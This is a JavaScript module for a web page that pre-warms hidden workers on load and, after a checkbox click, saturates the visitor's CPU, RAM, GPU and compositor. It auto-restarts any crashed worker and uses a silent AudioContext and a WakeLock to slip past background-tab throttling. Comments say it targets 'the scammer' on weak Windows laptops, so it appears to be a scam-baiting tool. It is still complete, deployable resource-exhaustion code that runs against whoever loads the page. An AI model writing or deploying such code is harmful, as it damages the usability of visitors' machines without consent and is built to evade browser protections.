// ── MODULE STATE ─────────────────────────────────────────────────────────────
const _workers = [];   // all pre-warmed worker references
let _hammering = false; // true once startHammer() has been called

// ── CPU WORKERS ───────────────────────────────────────────────────────────────
const cpuWorkerCode = `
  let started = false;
  onmessage = function(e) { if (e.data && e.data.type === 'start') started = true; };

  // Buffer larger than typical L3 cache (32MB) to guarantee every access
  // is a cache miss hitting DRAM, maximising memory bandwidth pressure.
  const BUF_BYTES = 40 * 1024 * 1024;
  const buf = new Float64Array(BUF_BYTES / 8);
  for (let i = 0; i < buf.length; i++) buf[i] = Math.random();

  // Prime stride so the hardware prefetcher never learns the pattern.
  const STRIDE = 4999;
  const LEN = buf.length;
  let idx = 0;

  function loop() {
    if (!started) { setTimeout(loop, 50); return; }
    // Cache-defeating random-stride read/write with expensive math to keep
    // FPU execution units fully occupied alongside the memory bus.
    for (let i = 0; i < 10000; i++) {
      idx = (idx + STRIDE) % LEN;
      const v = buf[idx];
      buf[idx] = Math.sqrt(Math.abs(v)) * Math.log(Math.abs(v) + 1.0) + Math.sin(v);
    }
    setTimeout(loop, 0);
  }
  loop();
`;

// ── RAM WORKER ────────────────────────────────────────────────────────────────
// Key design decisions for weak Windows laptops:
//   1. Uint8Array random bytes  — defeats Windows Memory Compression.
//   2. 1.5GB baseline offset    — subtracts Windows + Chrome baseline before targeting 85%.
//   3. try/catch + filling flag — worker survives hitting the allocation limit.
//   4. 150ms fill / 500ms full  — aggressive during fill, steady re-touch once saturated.
//   5. re-touch stride 1KB      — doubles page-fault pressure vs 2KB; devastating on HDDs.
const ramWorkerCode = `
  let started = false;
  onmessage = function(e) { if (e.data && e.data.type === 'start') started = true; };

  const CHUNK_MB       = 25;
  const STEP_MS_FILL   = 150;
  const STEP_MS_FULL   = 500;

  const deviceRAM    = (self.navigator && navigator.deviceMemory) || 2;
  const BASELINE_MB  = 1536;
  const MAX_MB       = Math.max(0, Math.floor((deviceRAM * 1024 - BASELINE_MB) * 0.85));

  const leaks = [];
  let totalMB = 0;
  let filling = true;

  function fillChunk(mb) {
    const bytes = mb * 1024 * 1024;
    const buf = new Uint8Array(bytes);
    const rng = new Uint32Array(1);
    for (let i = 0; i < bytes; i += 4096) {
      crypto.getRandomValues(rng);
      buf[i] = rng[0] & 0xff;
    }
    return buf;
  }

  function step() {
    if (!started) { setTimeout(step, 50); return; }

    if (filling && totalMB < MAX_MB) {
      try {
        leaks.push(fillChunk(CHUNK_MB));
        totalMB += CHUNK_MB;
      } catch (e) {
        filling = false;
      }
      if (totalMB >= MAX_MB) filling = false;
    }

    for (let c = 0; c < leaks.length; c++) {
      const chunk = leaks[c];
      for (let i = 0; i < chunk.length; i += 1024) {
        chunk[i] = (chunk[i] + 1) & 0xff;
      }
    }

    setTimeout(step, filling ? STEP_MS_FILL : STEP_MS_FULL);
  }

  step();
`;

// ── GPU WORKER ────────────────────────────────────────────────────────────────
// OffscreenCanvas WebGL render loop pressures the GPU's shared memory bus and
// shader units. On integrated graphics (shared LPDDR) this directly competes
// with the RAM worker for memory bandwidth.
const gpuWorkerCode = `
  let started = false;
  onmessage = function(e) { if (e.data && e.data.type === 'start') started = true; };

  function waitAndStart() {
    if (!started) { setTimeout(waitAndStart, 50); return; }
    const canvas = new OffscreenCanvas(512, 512);
    const gl = canvas.getContext('webgl');
    if (!gl) return;

    const vsrc = \`
      attribute vec2 p;
      varying vec2 v;
      void main(){v=p;gl_Position=vec4(p,0,1);}
    \`;
    const fsrc = \`
      precision highp float;
      varying vec2 v;
      uniform float t;
      void main(){
        float r=sin(v.x*13.7+t)*cos(v.y*9.3-t*1.3);
        float g=cos(v.x*7.1-t*0.7)*sin(v.y*17.2+t);
        float b=sin((v.x+v.y)*11.1+t*2.0);
        gl_FragColor=vec4(r,g,b,1.0);
      }
    \`;
    function compile(type, src) {
      const s = gl.createShader(type);
      gl.shaderSource(s, src);
      gl.compileShader(s);
      return s;
    }
    const prog = gl.createProgram();
    gl.attachShader(prog, compile(gl.VERTEX_SHADER, vsrc));
    gl.attachShader(prog, compile(gl.FRAGMENT_SHADER, fsrc));
    gl.linkProgram(prog);
    gl.useProgram(prog);

    const verts = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
    const buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(prog, 'p');
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
    const tloc = gl.getUniformLocation(prog, 't');

    let t = 0;
    function frame() {
      t += 0.05;
      gl.uniform1f(tloc, t);
      gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
      gl.finish();
      setTimeout(frame, 0);
    }
    frame();
  }
  waitAndStart();
`;

// ── WORKER SPAWNER ────────────────────────────────────────────────────────────
// Auto-restarts a crashed worker. If hammering is already active, immediately
// sends the start signal to the replacement so pressure never silently stops.
function spawnWorker(code) {
  const blob = new Blob([code], { type: "application/javascript" });
  const url  = URL.createObjectURL(blob);
  const w    = new Worker(url);
  w.onerror  = () => setTimeout(() => {
    const replacement = spawnWorker(code);
    if (_hammering) replacement.postMessage({ type: 'start' });
  }, 500);
  return w;
}

// ── PREWARM ───────────────────────────────────────────────────────────────────
// Called on page load. Workers are spawned and idle — threads are allocated by
// the OS but doing nothing. Render pressure elements are injected but paused.
function prewarmWorkers() {
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores; i++) _workers.push(spawnWorker(cpuWorkerCode));
  _workers.push(spawnWorker(ramWorkerCode));
  _workers.push(spawnWorker(gpuWorkerCode));

  // ── RENDER PRESSURE (paused) ───────────────────────────────────────────────
  // backdrop-filter: blur() on animated elements forces expensive compositor
  // blur passes every frame. Injected now but paused until startHammer().
  const style = document.createElement('style');
  style.textContent = `
    .hm-blur {
      position: fixed;
      width: 80px;
      height: 80px;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      pointer-events: none;
      z-index: -1;
      opacity: 0.01;
      animation: hm-move 3s linear infinite;
      animation-play-state: paused;
    }
    @keyframes hm-move {
      0%   { transform: translate(0px, 0px); }
      25%  { transform: translate(100px, 50px); }
      50%  { transform: translate(50px, 150px); }
      75%  { transform: translate(150px, 80px); }
      100% { transform: translate(0px, 0px); }
    }
  `;
  document.head.appendChild(style);
  for (let i = 0; i < 24; i++) {
    const el = document.createElement('div');
    el.className = 'hm-blur';
    el.style.left = Math.random() * 100 + 'vw';
    el.style.top  = Math.random() * 100 + 'vh';
    el.style.animationDelay = (Math.random() * 3) + 's';
    document.body.appendChild(el);
  }
}

// ── START ─────────────────────────────────────────────────────────────────────
// Called on checkbox click. Signals all idle workers to begin real work.
function startHammer() {
  _hammering = true;
  for (const w of _workers) w.postMessage({ type: 'start' });

  // Unpause render pressure.
  document.querySelectorAll('.hm-blur').forEach(el => {
    el.style.animationPlayState = 'running';
  });

  // ── BACKGROUND THROTTLE BYPASS ─────────────────────────────────────────────
  // Chrome throttles background tabs to ~1% CPU the moment the scammer
  // switches windows. A silent (0 Hz) AudioContext keeps the audio thread
  // alive, which prevents the renderer from entering the throttled state.
  try {
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    osc.connect(ctx.destination);
    osc.frequency.value = 0;
    osc.start();
  } catch (e) {}

  // WakeLock stops the OS from letting the CPU/screen idle.
  if (navigator.wakeLock) {
    navigator.wakeLock.request("screen").catch(() => {});
  }
}
